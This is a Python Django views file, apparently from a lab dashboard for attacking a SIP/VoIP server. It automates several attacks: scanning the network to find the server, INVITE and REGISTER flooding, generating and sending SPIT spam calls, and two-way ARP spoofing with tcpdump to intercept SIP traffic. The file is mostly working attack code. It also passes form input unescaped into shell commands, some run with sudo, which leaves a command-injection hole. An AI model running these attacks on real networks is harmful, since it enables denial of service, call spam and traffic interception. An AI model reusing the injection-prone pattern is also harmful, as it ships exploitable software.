import subprocess
import time
import re
from django.http import HttpResponse
from django.shortcuts import render

def enumerationAttack(request):
    try:
        result = subprocess.run(
            "ip a", shell=True, capture_output=True, text=True
        )
        output = result.stdout
        error = result.stderr
        resultGateway = subprocess.run(
            "ip route | grep default", shell=True, capture_output=True, text=True
        )
        outputGateway = resultGateway.stdout
        errorGateway = resultGateway.stderr

        matchGateway = re.search(r'default\s+via\s+(\d+\.\d+\.\d+\.\d+)\s+', outputGateway)
        match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+/\d+)\s+brd.*', output)
        if match and matchGateway:
            gateway_IP = matchGateway.group(1)
            request.session['gateway_IP'] = gateway_IP
            print(f"Found gateway IP: {gateway_IP}")
            subnet = match.group(1)
            print(f"Found subnet: {subnet}")
            attacker_IP = subnet.split('/')[0]
            request.session['attacker_IP'] = attacker_IP
            print(f"Found attacker IP: {attacker_IP}")
            interface = match.group(0).split(" ")[-1]
            request.session['interface'] = interface
            print(f"Found interface: {interface}")

            command = f"svmap {subnet}"
            try:
                scanresult = subprocess.run(
                    command, shell=True, capture_output=True, text=True
                )
                scanoutput = scanresult.stdout
                scanerror = scanresult.stderr
                print("Scan Error: ", scanerror)

                if scanoutput:
                    matchIP = re.search(r'\|\s+(\d+\.\d+\.\d+\.\d+):\d+\s+\|', scanoutput)
                    if matchIP:
                        server_IP = matchIP.group(1)
                        print("Server IP Address:", server_IP)
                        request.session['server_IP'] = server_IP
                    else:
                        print("No Server IP match found!")
                return render(request, 'attack_result.html', {'result': f"{scanoutput}\n\nSaving the first IP received as the SIP Server IP."})
            except Exception as e:
                return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})
        else:
            return render(request, 'attack_result.html', {'result': f"Subnet not found. Make sure attacker machine is in the same local area network as SIP server and try again!\n\nErrors in finding subnet:\n{error}\n\nErrors in finding gateway:\n{errorGateway}"})
        
    except Exception as e:
        return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})
    
def inviteAttack(request):
    server_IP = request.session.get('server_IP', None)
    interface = request.session.get('interface', None)
    if server_IP and interface:
        reqs = request.POST.get('reqs', None)
        username = request.POST.get('username', None)
        if reqs and username:
            command = f"sudo inviteflood {interface} {username} {server_IP} {server_IP} {reqs} -v"
            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True
                )
                output = result.stdout
                error = result.stderr
                print("Attack Error: ", error)
                return render(request, 'attack_result.html', {'result': f"Successfully executed INVITE Flooding attack!\nPerform log analysis of '/var/log/asterisk/full' log file in the SIP server to verify the occurrence of INVITE flood attack.\n\n{output}"})
                
            except Exception as e:
                return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})     
        else:
            return render(request, 'attack_result.html', {'result': "Missing required parameters."})
    else:
        return render(request, 'attack_result.html', {'result': "SIP Server IP not found. Please run SIP enumeration attack first if there is an active SIP server in the local area network. Thereafter, try this attack again!"})
    
def SPITAttack(request):
    server_IP = request.session.get('server_IP', None)
    attacker_IP = request.session.get('attacker_IP', None)
    if server_IP and attacker_IP:
        username = request.POST.get('username', None)
        if username:
            try:
                result = subprocess.run(
                    f"python3 /home/kali/Desktop/spit_generator.py {username} {server_IP} {attacker_IP}", shell=True, capture_output=True, text=True
                )
                output = result.stdout
                error = result.stderr
                if "SPIT attack scenario generated successfully!" in output:
                    command = f"sipp -sf /home/kali/Desktop/spit_attack.xml -s {username} {server_IP} -r 10 -l 100 -m 150 -trace_msg > /home/kali/Desktop/SPITVerificationStats.txt"
                    try:
                        attackresult = subprocess.run(
                            command, shell=True, capture_output=True, text=True
                        )
                        attackerror = attackresult.stderr
                        print("Attack Error: ", attackerror)
                        
                        statresult = subprocess.run(
                            "/home/kali/Desktop/SPITGetStat.sh", shell=True, capture_output=True, text=True
                        )
                        statoutput = statresult.stdout
                        return render(request, 'attack_result.html', {'result': f"{statoutput}\n\nThe statistics and information about this SPIT attack has also been saved to 'SPITVerificationStats.txt' file on the Desktop of the Kali machine.\nThe attack scenario file used to perform this attack has been saved to 'spit_attack.xml' file on the Desktop of the Kali machine.\nThe SIP messages during this SPIT attack have been logged in a '.log' file on the Desktop of the Kali machine"})
                    except Exception as e:
                        return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})
                else:
                    return render(request, 'attack_result.html', {'result': f"Failed to create SPIT attack scenario file. Try the attack again from homepage dashboard!\n\nErrors:\n{error}"})
                
            except Exception as e:
                return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})    
        else:
            return render(request, 'attack_result.html', {'result': "Missing required parameters."})
    else:
        return render(request, 'attack_result.html', {'result': "SIP Server IP not found. Please run SIP enumeration attack first if there is an active SIP server in the local area network. Thereafter, try this attack again!"})
    
def registerAttack(request):
    server_IP = request.session.get('server_IP', None)
    if server_IP:
        low = request.POST.get('low', None)
        high = request.POST.get('high', None)
        if low and high:
            lower_val = min(low, high)
            higher_val = max(low, high)
            command = f"svwar -m REGISTER -e {lower_val}-{higher_val} -z 4 {server_IP}"
            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True
                )
                output = result.stdout
                error = result.stderr
                print("Attack Error: ", error)
                return render(request, 'attack_result.html', {'result': "Successfully executed REGISTER Flooding attack!\nPerform log analysis of '/var/log/asterisk/full' log file in the SIP server to verify the occurrence of REGISTER flood attack."})
            except Exception as e:
                return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})
                
        else:
            return render(request, 'attack_result.html', {'result': "Missing required parameters."})
    else:
        return render(request, 'attack_result.html', {'result': "SIP Server IP not found. Please run SIP enumeration attack first if there is an active SIP server in the local area network. Thereafter, try this attack again!"})

def trafficCapture(request):
    server_IP = request.session.get('server_IP', None)
    interface = request.session.get('interface', None)
    gateway_IP = request.session.get('gateway_IP', None)
    if server_IP and interface and gateway_IP:
        duration = int(request.POST.get('duration', None))
        if duration:
            command1 = f"sudo arpspoof -i {interface} -t {server_IP} {gateway_IP}"
            command2 = f"sudo arpspoof -i {interface} -t {gateway_IP} {server_IP}"
            command3 = f"sudo tcpdump -i {interface} host {server_IP} and port 5060 -vvv -w /home/kali/Desktop/sip_traffic.pcap"
            try:
                process1 = subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{command1}; exec bash'], start_new_session=True)
                process2 = subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{command2}; exec bash'], start_new_session=True)
                process3 = subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{command3}; exec bash'], start_new_session=True)
                process_pids = [process3.pid, process1.pid, process2.pid]
                time.sleep(duration)

                try:
                    for pid in process_pids:
                        subprocess.run(f"sudo kill -9 {pid}", shell=True)
                    print("Stopped all traffic capture processes.")
                    result = subprocess.run(
                        "python3 /home/kali/Desktop/analyze.py", shell=True, capture_output=True, text=True
                    )
                    output = result.stdout
                    return render(request, 'attack_result.html', {'result': f"{output}\n\nThe traffic flow and statistics about the captured traffic has also been saved to 'automated_analysis.txt' file on the Desktop of the Kali machine.\nThe complete traffic captured in the pcap format has been saved to 'sip_traffic.pcap' file on the Desktop of the Kali machine."})
                except Exception as e:
                    return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"}) 
    
            except Exception as e:
                return render(request, 'attack_result.html', {'result': f"Error executing command: {str(e)}"})     
        else:
            return render(request, 'attack_result.html', {'result': "Missing required parameters."})
    else:
        return render(request, 'attack_result.html', {'result': "Gateway IP and SIP Server IP not found. Please run SIP enumeration attack first if there is an active SIP server in the local area network. Thereafter, try this attack again!"})